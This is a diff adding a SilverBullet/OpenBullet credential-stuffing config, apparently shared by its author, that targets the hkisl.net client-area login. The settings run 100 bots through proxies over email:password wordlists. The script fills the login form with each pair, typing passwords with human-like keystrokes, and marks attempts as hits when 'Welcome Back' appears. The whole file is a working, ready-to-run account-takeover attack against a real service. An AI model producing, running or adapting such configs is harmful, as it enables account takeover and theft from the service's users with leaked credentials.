@@ -1,0 +1,93 @@
+[SETTINGS]
+{
+  "Name": "hkisl-selenium",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-01-01T20:32:03.3703612+02:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@uzzzul",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "hkisl-selenium",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+BROWSERACTION Open 
+
+NAVIGATE "https://www.hkisl.net/clientarea.php" 
+
+#delay FUNCTION Delay "5000" 
+
+#USER ELEMENTACTION XPath "//*[@id=\"inputEmail\"]" 
+  SendKeys "<USER>" 
+
+#delay FUNCTION Delay "1000" 
+
+#PASS ELEMENTACTION XPath "//*[@id=\"inputPassword\"]" 
+  SendKeysHuman "<PASS>" 
+
+#delay FUNCTION Delay "1000" 
+
+#LOGIN ELEMENTACTION XPath "//*[@id=\"login\"]" 
+  Click 
+
+BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Login Details Incorrect. Please try again." 
+  KEYCHAIN Success OR 
+    KEY "Welcome Back, " 
+
+#author FUNCTION Constant "@uzzzul" -> CAP "configby" 
+
